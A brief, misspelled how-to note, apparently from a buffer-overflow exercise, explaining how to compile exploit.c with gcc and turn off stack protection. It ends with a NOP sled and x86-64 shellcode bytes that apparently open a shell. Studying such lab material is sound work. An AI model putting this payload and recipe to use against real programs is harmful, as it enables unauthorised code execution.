To compile the C code to a executable you will need gcc installed.
gcc is the c compiler, and the command is:
  gcc exploit.c
this will produse a.out file tht is executable with ./a.out.
You can use the option -o <outputn name> to choose the output name

example:
gcc exploit.c -o exploit -fno-stack-protector
Here we also add the -fno-stack-protector option,
so that it will take away the protection for the memory stack.

you may need to write the nop before the shellcode.
nop = b'\x90'*192
shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
